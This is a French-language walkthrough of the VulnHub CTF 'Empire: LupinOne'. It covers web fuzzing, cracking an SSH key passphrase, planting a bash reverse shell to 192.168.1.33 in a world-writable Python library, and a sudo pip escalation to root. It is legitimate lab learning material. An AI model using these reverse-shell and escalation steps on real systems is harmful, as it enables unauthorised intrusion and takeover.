---
title: "CTF Empire: LupinOne"
date: 2021-11-07
tags: ["Pentest", "CTF"]
download: https://www.vulnhub.com/entry/empire-lupinone,750
---

## Avant propos

Le déroulé de ce hack a été réalisé sur une machine prévue à cette effet. Il est interdit de mener ce genre d'action sur une machine qui ne vous appartient pas sans l'accord de son ou sa propriétaire.  
Ce CTF a été réalisé avec une machine attaquante **Kali 2021.3** (`lsb_release -r`).

## Enumération

On récupère l'adresse IP de la machine distante avec **Netdiscover** `sudo netdiscover`.  
Avant de poursuivre, on exporte cette adresse dans une variable pour être tranquille par la suite `export IP=192.168.1.38`.  
Puis on créé un dossier dédié à ce CTF `cd Documents/ctf && mkdir EmpireLupinOne && cd EmpireLupinOne`.  
On lance **Nmap** pour scanner les ports de la machine distante.

```bash
$ nmap -sV -sT -p- $IP -oN nmap.txt
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.48 ((Debian))
```

On a un serveur **SSH** sur le port **22** et un serveur **Apache** 2.4.48 sur le port **80**.  
Dans le fichier "robots.txt", on trouve un indice.

```txt
User-agent: *
Disallow: /~myfiles
```

On va utiliser l'outil **Ffuf** au lieu de **Wfuzz** pour découvrir le ou les pages présentes à la racine du serveur Apache par mot clef.

Remarque: **Ffuf** n'est pas installé par défaut sur [Kali Linux](https://www.kali.org/tools/ffuf). Il faut lancer la commande d'installation `sudo apt install ffuf`.

```bash
$ ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 'http://192.168.1.38/~FUZZ'
secret
```

On a une page "~secret" et un utilisateur potentiel "icex64".

```bash
curl http://$IP/~secret/ 
<br>Hello Friend, Im happy that you found my secret diretory, I created like this to share with you my create ssh private key file,</> 
<br>Its hided somewhere here, so that hackers dont find it and crack my passphrase with fasttrack.</> 
<br>I'm smart I know that.</>
<br>Any problem let me know</>
<h4>Your best friend icex64</>
```

En partant du principe que c'est un répertoire secret, on cherche un fichier texte préfixé par un point.

```bash
$ ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 'http://192.168.1.38/~secret/.FUZZ' -e .txt -fc 403
mysecret.txt
```

Le contenu de ce fichier contient une chaine de caractères qui se révèle être du [Base58](https://www.dcode.fr/identification-chiffrement) que l'on peut déchiffrer sur le même site [Dcode.fr](https://www.dcode.fr/chiffre-base-58).

On a une clef SSH qui commence par `-----BEGIN OPENSSH PRIVATE KEY-----` et se termine par `-----END OPENSSH PRIVATE KEY-----` que l'on copie dans une nouveau fichier "id_rsa.pem" dont on change le chmod `chmod 600 id_rsa.pem`.

Avec **ssh2john**, on copie le hash dans un nouveau fichier `/usr/share/john/ssh2john.py id_rsa.pem > hash` afin de trouver le mot de passe avec **John the Ripper**.

```bash
$ john hash --wordlist=/usr/share/wordlists/fasttrack.txt
P@55w0rd!
```

## Pénétration

On a l'utilisateur, la clef SSH et le mot de passe.

```bash
$ ssh icex64@$IP -i id_rsa.pem
password: P@55w0rd!
```

Dans le répertoire de l'utilisateur, on trouve le premier flag.

```bash
$ cat user.txt
3mp!r3{I_See_That_You_Manage_To_Get_My_Bunny}
```

## Escalation

Ensuite, on regarde les privilèges de l'utilisateur courant.

```bash
$ sudo -l
User icex64 may run the following commands on LupinOne:
    (arsene) NOPASSWD: /usr/bin/python3.9 /home/arsene/heist.py
```

On peut exécuter ce script Python avec l'utilisateur "arsene".

```bash
$ cat /home/arsene/heist.py 
import webbrowser

print ("Its not yet ready to get in action")

webbrowser.open("https://empirecybersecurity.co.mz")
```

Le script ne contient quasiment rien, si ce n'est la librairie "webbrowser". Sur le [Github](https://github.com/python/cpython/blob/3.10/Lib/webbrowser.py) de cette librarie, on voit que la librairie "Os" est utilisée. On va donc modifier cette dernière (on n'a pas les droit d'écriture sur le script final) afin d'exécuter un webshell.

```bash
$ find / -name webbrowser.py
/usr/lib/python3.9/webbrowser.py
-rwxrwxrwx 1 root root 24087 Oct  4 18:45 /usr/lib/python3.9/webbrowser.py
$ nano /usr/lib/python3.9/webbrowser.py
os.system("/bin/bash -c '/bin/bash -i >& /dev/tcp/192.168.1.33/1234 0>&1'")
```

Dans un autre onglet du terminal, on démarre le serveur **Netcat** sur le port "1234".

```bash
$ nc -lnvp 1234
listening on [any] 1234 ...
```

Puis on exécute le script Python `sudo -u arsene python3.9 /home/arsene/heist.py` et la connexion est effective avec l'utilisateur "arsene".

```bash
$ sudo -l
User arsene may run the following commands on LupinOne:
    (root) NOPASSWD: /usr/bin/pip
```

L'utilisateur a le droit d'éxécuter le gestionnaire de paquets de Python, **PIP**.

Avant tout, il faut se mettre en Shell `python3 -c 'import pty; pty.spawn("/bin/sh")'` pour pouvoir effectuer les commandes recommandées par [GTFOBins](https://gtfobins.github.io/gtfobins/pip/#sudo)

```bash
$ TF=$(mktemp -d)
$ echo "import os; os.execl('/bin/bash', 'bash', '-c', 'bash <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
$ sudo pip install $TF
$ id
uid=0(root) gid=0(root) groups=0(root)
```

On est bien en root et on trouve le dernier flag.

```bash
$ cat /root/root.txt
3mp!r3{congratulations_you_manage_to_pwn_the_lupin1_box}
```
